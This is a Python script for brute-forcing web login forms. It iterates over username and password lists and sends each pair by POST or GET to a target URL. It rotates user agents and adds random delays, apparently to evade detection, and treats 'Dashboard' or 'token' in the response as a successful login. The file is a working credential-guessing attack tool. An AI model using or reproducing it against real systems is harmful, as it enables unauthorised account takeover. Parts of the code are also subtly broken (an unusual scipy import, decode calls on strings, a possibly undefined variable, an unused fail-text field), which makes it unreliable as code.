import time
import requests
from scipy import rand


def brute(parameters):
    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'fail_text': parameters['fail_text'],
               }
    if parameters['user_list']:
        for user in parameters['user_list']:
            content['username'] = user
            if parameters['password_list']:
                for password in parameters['password_list']:
                    content['password'] = password
                    attack(content)
            else:
                content['password'] = parameters['password']
                attack(content)
                
    elif parameters['password_list']:
        content['username'] = parameters['username']
        for password in parameters['password_list']:
            content['password'] = password
            attack(content)
            
    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        attack(content)


def attack(content):
    payload = {
        content['user_param']: content['username'],
        content['password_param']: content['password'],
    }
    headers = {
        'user-agent': get_random_user_agent().encode().decode('utf-8'),
    }
    # Doing the post/get form
    if content['method'] == 'post':
        request = requests.post(content['url'], data=payload, headers = headers)
    else:
        request = requests.get(content['url'], data=payload, headers = headers)
    if check_login(request):
        print('login successfull\n\nusername: ' + content['username'].decode('utf-8') + '\npassword: ' + content['password'].decode('utf-8'))
        exit(0)


def get_random_user_agent():
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    delays = [5, 10, 15]
    delay = np.random.choice(delays)
    time.sleep(delay)
    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            prng = np.random.RandomState()
            index = prng.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[2:len(random_proxy)-2]
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[2:len(random_proxy)-2]

def check_login(request):
    if 'Dashboard' in request.text:
        return True
    if request.text.__contains__('token'):
        return True
    # print(request.text)
    return False

